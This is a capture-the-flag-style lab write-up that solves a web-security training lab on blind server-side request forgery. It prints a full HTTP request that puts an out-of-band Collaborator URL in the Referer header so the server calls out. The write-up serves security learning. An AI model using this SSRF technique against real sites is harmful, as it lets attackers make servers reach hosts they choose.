---
tags:
  - ssrf
  - OAST
---
# Blind SSRF with out-of-band detection

## Instructions

This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.

To solve the lab, use this functionality to cause an HTTP request to the public Burp Collaborator server.

!!! note 
	Note that Burp Professional is required for this lab since we need collaborator.

## Solution

View a product and then send that request to repeater. 

Replace the referer URL with a collaborator payload, as shown below. 

```text title="SSRF in referer header" hl_lines="8"
GET /product?productId=2 HTTP/2
Host: 0a39000a03068753817ab66c00bc005c.web-security-academy.net
Cookie: session=ASepnUXdnTkK6Yokeq0tYsF0PSmHfoB7
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://hyjqvo48j74xnor88pby8gbqwh28qzeo.oastify.com
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
X-Pwnfox-Color: magenta
Priority: u=0, i
Te: trailers


```

Note that after sending this request we get a hit in collaborator.

![](attachments/ssrf-lab-3/file-20251124113610641.webp)

This solves the lab. 